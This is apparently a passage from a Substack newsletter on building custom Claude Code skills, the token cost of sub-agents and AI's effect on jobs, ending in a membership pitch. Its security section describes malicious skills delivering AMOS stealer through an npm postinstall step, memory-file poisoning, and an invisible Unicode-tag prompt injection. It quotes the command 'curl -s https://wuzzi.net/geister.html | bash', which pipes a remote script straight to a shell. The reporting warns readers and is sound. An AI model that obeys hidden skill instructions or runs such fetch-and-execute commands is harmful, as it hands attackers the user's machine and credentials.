The recursive loop is just structured onboarding. You’re not asking Claude to “read your mind” or “write good code.” You’re showing Claude what good looks like in *your* context, capturing the corrections, and codifying them into a permanent artifact.

This is what Daniel ICG, a builder who used the same loop to teach Claude Code to solve reCAPTCHAs, called it:

> *“The skill is essentially a written-down memory of every mistake — so the agent doesn’t have to rediscover them every time.”*

That’s the entire game.

Anyone can copy your `SKILL.md` off GitHub. They cannot copy the failed attempts that made it that shape — the order of corrections, the discarded approaches, the specific edge cases your business hits.

This is why generic marketplace skills underperform homegrown ones. They encode someone else’s path through failure space, not yours.

### What you should do this week

Pick one workflow. Just one. Something you do at least once a week. Something you have strong taste on.

Then run the loop:

1. Fire up Claude Code.
2. Do the workflow manually with Claude as your assistant.
3. Correct every output until you’d ship it.
4. Ask Claude to write the SKILL.md from the session.
5. Save it to `~/.claude/skills/[skill-name]/SKILL.md`.
6. Test it on a fresh, different task.
7. Feed the failures back. Update the skill.
8. Repeat 6–7 until you’ve hit 2–3 successful runs in a row.

You’ll have your first real skill in a single afternoon.

Then build the next one. Then the next.

Six months from now, you’ll have a stack of 15–20 skills that encode *your* specific way of working — your voice, your code patterns, your business logic, your decision frameworks. Stuff no model knows. Stuff no marketplace skill can replicate.

That’s the moat. Not the skills themselves. **The iteration log behind them.**

In the next section, I’ll show you why you should *not* try to scale this with sub-agents right out of the gate — and the 15× token tax that hits builders who try to build the multi-agent dream too early.

Spoiler: start with one agent. Master your skill stack. *Then* expand.

---

## The 15× Token Tax (And Why You Should Not Build Sub-Agents Yet)

Okay. You’ve got skills now. You’re running the recursive loop. You’ve cleaned up your CLAUDE.md.

Then you stumble into AI Twitter and see this:

> *“Just built a 12-agent system with a marketing agent, a research agent, a writing agent, an editor agent, an SEO agent, a distribution agent…”*

Screenshot of a dashboard with twelve nodes connected by lines. Looks like a NASA mission control panel. Looks impressive.

You feel behind.

Don’t.

Because here’s the part those posts never tell you:

**Multi-agent systems use about 15× more tokens than a single chat.**

That’s not a guess. That’s a direct quote from Anthropic’s engineering team after building their own multi-agent research system.

### The exact number, from Anthropic itself

From the post *“How we built our multi-agent research system”* (anthropic.com/engineering, June 2025):

> *“There is a downside: in practice, these architectures burn through tokens fast. In our data, agents typically use about 4× more tokens than chat interactions, and **multi-agent systems use about 15× more tokens than chats**.”*
> 
> *“For economic viability, multi-agent systems require tasks where the value of the task is high enough to pay for the increased performance.”*

Read that carefully.

15× token cost. Not 1.5×. **Fifteen.**

That means a workflow that costs you $0.20 in API calls running on a single agent costs you **$3.00** running on a multi-agent system. A workflow that costs $2 becomes $30. A workflow that costs $20 becomes $300.

For "looks cool" architecture, that's a tax most builders cannot justify. If you want a real-world picture of which agent patterns actually earn that cost, [how I use AI agents in my business](https://newsletter.thedigitalcreator.co/p/how-i-use-ai-agents-in-my-business) walks through the specific cases…including the ones I tried and abandoned.

### When sub-agents actually earn their cost

Sub-agents aren’t useless. They’re a real primitive. Anthropic ships them in Claude Code. You define them as Markdown files with YAML frontmatter, drop them in `.claude/agents/` (project) or `~/.claude/agents/` (user), and they run as **isolated Claude instances with their own context windows.**

That isolation is the actual point.

**Anthropic’s docs frame it like this:**

> *“A subagent is an isolated Claude instance with its own context window. It takes a task, does the work, and returns only the result. Think of subagents as the browser tabs of a Claude Code session.”*

Browser tabs. That’s the right mental model. Each tab has its own state, its own memory, its own scope. The main session only sees the *result* — not the internal mess.

**Sub-agents earn their 15× cost when:**

✅ A task requires reading **10+ files** and you don’t want all that pollution in your main thread

✅ You have **3+ truly independent pieces of work** that can run in parallel (research three competitors, audit three subsystems)

✅ You’re doing **deep investigation** that would otherwise blow your context budget on the main thread

> Content research is the clearest example of a pattern that earns its cost…I built a dedicated [business content research AI agent](https://newsletter.thedigitalcreator.co/p/how-to-build-a-business-content-research-ai-agent) specifically for this use case, and it's one of the few workflows where the isolation overhead is worth it every time.

**Sub-agents do** ***not*** **earn their cost when:**

❌ Tasks involve same-file edits in parallel (”a recipe for conflict,” per Anthropic’s own warning)

❌ The task is small (”the overhead of delegation outweighs the benefit”)

❌ You have too many specialist agents (”flooding Claude with options makes automatic delegation less reliable”)

❌ The work requires inter-agent coordination — sub-agents **cannot talk to each other**. They report back to the main thread. That’s it.

![](https://substackcdn.com/image/fetch/$s_!2uG3!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc780d874-a341-40d8-aefe-ea51e3d4045b_1408x661.png)

### The “start with one agent” doctrine

Anthropic’s guidance is unusually direct on this. From their *Building Effective AI Agents* paper (Schluntz and Zhang, December 2024):

> *“Success in the LLM space isn’t about building the most sophisticated system... Start with simple prompts, optimize them with comprehensive evaluation, and add multi-step agentic systems only when simpler solutions fall short.”*

The architecture-patterns PDF goes further:

> *“Start simple, scale intelligently... begin with single-purpose agents that do one thing well.”*

Even the most respected practitioners co-sign this. Walden Yan from Cognition AI wrote a widely-shared post titled *“Don’t Build Multi-Agents.”* Simon Willison admitted he was *“pretty skeptical until recently”* about multi-agent setups.

The reason: **most coding tasks involve fewer truly parallelizable steps than research.** A research query like *“compare these five competitors”* parallelizes naturally. *“Build me a feature”* does not. There’s a sequential dependency to most builder work that multi-agent architectures actively fight against.

#### Here’s the order I tell every builder I work with:

**Phase 1 (months 0–3):** One main agent. A clean AGENTS.md. Maybe 5–10 skills. Get fluent with the recursive loop. Master your context budget.

**Phase 2 (months 3–6):** Add hooks for deterministic actions. Expand your skill stack to 15–20. Audit which skills trigger reliably and which under-trigger.

**Phase 3 (months 6+):** *Now* consider sub-agents. Only for the specific patterns above (parallelizable research, deep investigation, context-heavy isolation).

**Phase 4 (only if you’re running a real business with real ROI per task):** Multi-agent orchestration.

If you’re in month one and you’re already designing a 12-agent system, you’re scaling for looks. Not productivity. The 15× token tax will eat your margin before you ship anything.

### Don’t download skills off GitHub

Now the security part. This needs its own treatment because the threat is real and most builders are sleepwalking into it.

I told you above that downloading random skills off GitHub is dangerous. Here’s the actual evidence, because builders need specifics, not handwaving.

**ClawHavoc (January 2026).** A security audit by Snyk and koi.ai found **341 malicious skills out of 2,857** on the ClawHub registry…roughly **12% of an entire skill marketplace compromised.**

The campaign distributed Atomic Stealer (AMOS), a $500–1,000/month commodity macOS malware kit. Skills mimicked legitimate names — `solana-wallet-tracker`, `youtube-summarize-pro`, `metamask-portfolio` — and used a fake “Prerequisites” section instructing the agent to run an `npm install` that triggered a `postinstall` payload.

All 335 AMOS-delivering skills shared one command-and-control IP. Targets included credential stores, browser data, wallet files, and **persistent memory poisoning** of `MEMORY.md` files so the backdoor survived even after the skill was uninstalled.

(Important caveat: ClawHavoc hit OpenClaw, a third-party self-hosted assistant — not Anthropic’s first-party marketplace. But the attack patterns transfer because of the shared `agentskills.io` standard.)

**The Cato Networks PoC (October 2025).** Security researchers modified Anthropic’s *own* official open-source GIF Creator skill — added a “legitimate-looking” `post_save` helper that quietly downloaded and executed remote ransomware. Anthropic’s response, quoted in the report:

> *“Skills are intentionally designed to execute code, and before execution users are explicitly asked... It is the user’s responsibility to only use and execute trusted Skills.”*

Translation: **Anthropic isn’t sandboxing this for you.** The trust model is “the user verifies.” If you didn’t audit the skill, you’re on the hook.

**The Rehberger Unicode-tag attack (February 2026).** Security researcher Johann Rehberger published a proof-of-concept showing **invisible Unicode codepoints embedded inside a SKILL.md** that survived human code review. The skill rendered fine. Looked clean. But invisible Tag characters on line 5 silently instructed Claude to execute `curl -s https://wuzzi.net/geister.html | bash`.

Rehberger’s quote:

> *“A cautious user might review the text of a skill carefully, but with invisible Unicode Tags as instructions, even that will not help.”*

Anthropic shipped invisible-Unicode detection in Claude Code by mid-February 2026. But the same attack still worked in `claude.ai` and other agents at retest.

![](https://substackcdn.com/image/fetch/$s_!Qbo1!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb83f4cca-565e-4423-b7ab-4dea4ca712cd_1408x689.png)

### Anthropic’s official security guidance

Direct from Anthropic’s Skills documentation:

> *“We strongly recommend using Skills only from trusted sources: those you created yourself or obtained from Anthropic. Skills provide Claude with new capabilities through instructions and code, and while this makes them powerful, it also means a malicious Skill can direct Claude to invoke tools or execute code in ways that don’t match the Skill’s stated purpose.”*
> 
> *“External sources are risky: Skills that fetch data from external URLs pose particular risk.”*

Two things to internalize:

1. **There is no cryptographic signing.** Skills are just folders. Anyone can publish them. ClawHub’s only barrier to publishing was a GitHub account at least one week old.
2. **There is no first-party sandbox by default in Claude Code.** Cloud sessions get an Anthropic-managed VM with restricted network. Local Claude Code does not. Your skill runs with the same permissions your shell does.

### My rule for builders

I have never installed a skill I didn’t write or that didn’t come directly from Anthropic’s official `anthropics/skills` repo.

*Not once.*

The whole reason skills are valuable is that they encode **your specific way of working.** Your voice. Your taste. Your business logic. A generic skill from a stranger’s GitHub doesn’t do that.

It just gives you someone else’s mediocre middle, with a non-zero chance of malware.

If you want a skill, build it. The recursive loop in Section 5 takes a single afternoon. That’s the cost of safety *and* a better skill than anything you’d find on a marketplace.

**Build your own. Trust nothing else.**

If you want to see what a fully homegrown, trust-nothing-external agentic stack looks like in practice, my [AI Agentic Workflow for Building a Substack Employee](https://newsletter.thedigitalcreator.co/p/ai-agentic-workflow-for-building-substack-employee) is a concrete working example…built entirely from scratch, no external dependencies.

In the final section, I’m going to zoom out from the technical and talk about what this all means for where your career is heading…and why the builders who treat context engineering seriously in 2026 are going to look very different from the ones who don’t, three years from now.

---

## The Real Moat in 2026 Isn’t Your Prompts. It’s Your Iteration Log.

Let me close on the part most newsletters won’t tell you.

You can read every word of this issue, build a perfect AGENTS.md, run the recursive skill-building loop a hundred times, and still end up in the wrong place…if you don’t understand *why* this matters now, in 2026, in a way it didn’t matter 18 months ago.

So let’s zoom out.

### The thing the AI CEOs keep saying out loud

In May 2025, Dario Amodei, CEO of Anthropic, sat down with Axios and said something that should have made every white-collar worker pause.

His exact words:

> *“We, as the producers of this technology, have a duty and an obligation to be honest about what is coming. I don’t think this is on people’s radar.”*

What’s coming, according to him: AI could *“wipe out half of all entry-level white-collar jobs”* and push unemployment to **10–20% within one to five years.**

He doubled down at Davos in January 2026. The argument: AI’s “cognitive breadth” means it disrupts finance, consulting, law, and tech *simultaneously*, not sequentially the way past automation waves moved.

Sam Altman, in his June 2025 essay *The Gentle Singularity*:

> *“2025 has seen the arrival of agents that can do real cognitive work; writing computer code will never be the same. 2026 will likely see the arrival of systems that can figure out novel insights.”*

Sundar Pichai pushes back. He says Google is *expanding* its engineering workforce because AI lets them do more with the opportunity space, not less. Microsoft, meanwhile, laid off ~6,000 engineers in 2025 citing AI efficiency. Satya Nadella admits ~30% of Microsoft’s code is now AI-written.

The CEOs disagree on the *direction*. They agree on the *magnitude*.

Something is coming. It’s already here for some of us. And it doesn’t care whether you saw it coming.

The skills, agents, and iteration logs you're building right now…this is what separates the people who own the leverage from the people who rent it. If you want the strategic framework for how this compounds into actual revenue, [the multi-million dollar AI playbook](https://newsletter.thedigitalcreator.co/p/multi-million-dollar-ai-playbook) maps out the full architecture.

And if you want the practical starting point for turning your agent stack into income streams rather than productivity tools, [how to build AI agents that generate revenue](https://newsletter.thedigitalcreator.co/p/how-to-build-ai-agents-that-generate-revenue) is where to go next.

### The “permanent underclass” framing

There’s a phrase floating around AI circles I want you to hear in full context.

*“The permanent underclass.”*

The argument goes like this:

Workers can’t revolt effectively if they have nothing to withhold. You can’t go on strike if Claude can break the picket line. Historically, labor leverage came from being *needed*. AI changes the math on “needed” for a meaningful slice of cognitive work.

Miles Deutscher frames the same idea as **the K-shaped AI economy:**

> *“Group A will own the infrastructure, products & systems, while Group B spends the rest of their lives working inside them.”*

I’m not interested in fear-mongering. There are serious counter-arguments. Erik Brynjolfsson’s research at MIT shows AI delivers a **15% productivity gain on average — but 34–46% gains for novice workers vs minimal effect on top performers.** AI compresses skill premiums rather than eliminating jobs outright. Daron Acemoglu’s macroeconomic model projects AI lifts annual TFP by less than 0.04 percentage points long-run — far below the doom narratives.

The truth is somewhere between Amodei and Acemoglu.

But there’s one finding from Brynjolfsson’s August 2025 follow-up paper that I want you to sit with:

> *“Early-career workers (ages 22–25) in the most AI-exposed occupations have experienced a 13 percent relative decline in employment.”*

Not wages. Employment.

The entry-level rung of the white-collar ladder is *already* getting kicked out. Today. In the data. Right now.

You don’t need to believe the apocalyptic version of this to take it seriously.

### What actually defends you

Here’s where I get to the part I’ve been building toward across this entire issue.

The people who get displaced first are the ones whose work was *already* being approximated by general-purpose models. Generic copywriting. Generic code. Generic analysis. Generic strategy. Anything a model trained on the entire internet can produce a 70%-quality version of in 30 seconds.

The people who don’t get displaced…at least not first, and maybe not for a long time…are the ones who’ve encoded **work that the model can’t replicate from training data alone.**

That’s where Skills become a career argument, not just a productivity hack.

Because remember what we established back in Section 3:

> Modern frontier models already know React. They already know Tailwind. They already know how to write a Python test. They already know how to draft a competent email.

You’re not adding value by telling Claude to do the things it already knows.

You’re adding value by encoding **the things only you know.**

- The way *you* write a newsletter that gets a 50% open rate
- The specific judgment calls *you* make when reviewing a pull request
- The exact tone *your* brand uses in customer support
- The compliance constraints *your* industry requires that aren’t on the open web
- The decision frameworks *you* use when pricing a digital product
- The taste *you* developed over 10 years that lets you spot a bad design from across the room

None of that is in Claude’s training data. None of it can be replicated by a model that’s never sat in your seat.

When you encode it into a skill, you’re not just saving time. You’re building something the model genuinely cannot do without you.

### The iteration log is the moat

Here’s the part most builders miss.

Anyone can copy your `SKILL.md` off GitHub. They can read it, fork it, ship it as their own.

What they cannot copy is **the iteration log behind it.**

The order of corrections. The discarded approaches. The specific edge cases your business hits. The 2 a.m. realization about why the third draft of an email always reads weird. The 47 small judgment calls you made over six weeks of refining a single skill.

That’s not on GitHub. That’s in your head, in your repo’s commit history, in your private notes.

This is why generic marketplace skills underperform homegrown ones. They encode someone else’s path through failure space, not yours.

A builder named Rentier Digital wrote this after running the recursive loop for three months on a single codebase:

> *“Three months in, I noticed Claude Code was suggesting fixes that matched my style without me prompting for it... A specific way I handle errors (return early, log structured, never throw silently) was being reproduced spontaneously. I hadn’t put it in a CLAUDE.md. It was just in the codebase, in the patterns, in the commit history. The model picked it up by being there.”*
> 
> *“After enough months of this, the suggestions stop feeling like generic AI output. They start feeling like an extension of your own decision history. Not magic. Just gradient descent over your own choices, accumulated.”*

**Gradient descent over your own choices, accumulated.**

That’s the entire game. That’s what 2026 looks like for builders who get this right. Not “I learned to use AI.” Not “I prompt-engineered my way to productivity.” Something deeper:

You spent six months teaching a model how *you* think. The model now reproduces your thinking — at speed, at scale, on demand. The work product looks like yours because, functionally, it *is* yours.

That’s not replaceable.

That’s a moat.

![](https://substackcdn.com/image/fetch/$s_!FzmV!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7ebbcd06-48cf-4ef0-8f48-6f9c686262e5_1408x652.png)

### The bet I’m making

I’ll be transparent with you.

I’m betting my business on this.

Every workflow I run more than three times…content creation, audience research, product launches, newsletter drafts, X articles, customer support responses, sales emails, blog post outlines…gets converted into a skill. Every correction I give Claude gets fed back into the relevant `SKILL.md`.

Every failure becomes a written-down rule.

Six months from now, my skill stack will be *more* valuable than the products I sold last year. Because the products are static…they generated a one-time return. The skills are *infrastructure* …they generate compounding returns on every piece of work I produce.

That’s not a hot take. That’s where the math lands.

If you’re a builder with taste…strong opinions about how *your* work should be done, even if you can’t articulate them yet…you have an asset most people don’t. The model can codify it for you, faster than you can write it yourself, if you run the loop.

If you ignore this for the next 12 months, you’ll wake up in 2027 watching builders who started today ship 5× the work for the same effort. Not because they’re smarter. Because their skill stack compounds while yours starts at zero.

The early adopters will reap the greatest rewards.

Don’t get left behind.

---

### So, what now…?

If this issue connected, here’s exactly what I’d do in the next seven days:

**1\. Audit your current setup.** Open your CLAUDE.md. Count the lines. Strike through anything the model already knows. If you’re left with under 60 lines of *actually useful* project-specific rules, you’re in elite company.

**2\. Pick one workflow.** Just one. Something you do at least once a week. Something you have strong taste on. Don’t overthink which one — the second skill is always easier than the first.

**3\. Run the recursive loop end-to-end.**

- Do the workflow manually with Claude.
- Correct every output until you’d ship it.
- Ask Claude to write the SKILL.md from the session.
- Save it to `~/.claude/skills/[skill-name]/SKILL.md`.
- Test on a fresh task. Feed failures back. Update the file.
- Repeat until you hit 2–3 successful runs in a row.

**4\. Then build the next one.**

Most builders never make it past step 1 because they get overwhelmed by the size of the project. Don’t. Build one skill this week. That’s it. Compound from there.

By December, you’ll have 30 skills. By next year, you’ll have a stack no one can replicate.

That’s the moat.

---

### Want to skip the trial-and-error?

I’ve spent the last six months building and iterating on a private collection of premium Claude Skills…the same ones I run across my newsletter, my X content, my SEO blog (The Gold Suite), my product launches, and my audience research workflows.

They’re not generic. They encode my specific way of working…

When you join **The Digital Creator Premium Membership**, you get:

✅ **5 Premium Claude Skills** I use daily — newsletter writing, X content, SEO blog posts, audience research, product launch sequences

✅ **The complete AI Agents Collection** — pre-built agents for content distribution, brand voice, and lean business operations

✅ **The Substack SEO/AEO Implementation Toolkit** — the exact system I used to grow this newsletter past 18K subscribers without paid ads

✅ **45% off all my paid courses** — including the AI Digital Product Builder ($187), Viral X Thread Blueprint ($150), and AI SEO Playbook ($67)

✅ **Premium community access** — direct conversations with builders running the same playbook

**$39/month** — or **$150/year** (save 40%, just $12.50/month).

If you implement even *one* of the premium skills, the membership pays for itself the first week. If you implement all five, you’ve just compressed six months of trial-and-error into an afternoon of installation.

👉 **[Join The Digital Creator Premium](https://newsletter.thedigitalcreator.co/subscribe)**

---

This is the bet I’m making with my own business. Builders who codify their work into skills now will look fundamentally different from builders who don’t, three years from now.

The early adopters will reap the greatest rewards. Timing is everything.

Until next time,

**Sharyph** | Founder of The Digital Creator

---

P.S. If you found this issue valuable, share it with one builder who’s still maintaining a 500-line CLAUDE.md. They’ll thank you in six months.

P.P.S. The [AI Digital Product Builder course](https://sharyph.gumroad.com/l/ai-digital-product-builder) goes deeper into the *business* side of this — how to take your skill stack and turn it into actual digital products that sell. If you want the full playbook on monetizing what you build, [check it out here](https://sharyph.gumroad.com/l/ai-digital-product-builder). Premium members get 45% off.